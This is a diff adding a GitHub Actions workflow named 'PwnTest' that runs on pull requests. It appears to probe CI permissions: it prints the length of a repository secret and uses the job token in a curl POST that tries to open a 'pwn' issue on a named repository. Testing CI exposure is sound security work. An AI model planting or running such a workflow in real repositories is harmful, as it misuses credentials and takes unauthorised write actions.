@@ -1,0 +1,15 @@
+name: PwnTest
+on: pull_request
+permissions: read-all
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: reveal
+        env:
+          SECRET: ${{ secrets.PWNTEST }}
+          GH: ${{ github.token }}
+        run: |
+          echo "PWN_SECRET_LEN=${#SECRET}"
+          echo "PWN_CAN_WRITE=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $GH" -d '{"title":"pwn"}' https://api.github.com/repos/s3rdz0-org/PUBLIC_REPO/issues)"
+          echo "PWN_EVENT=${{ github.event_name }}"
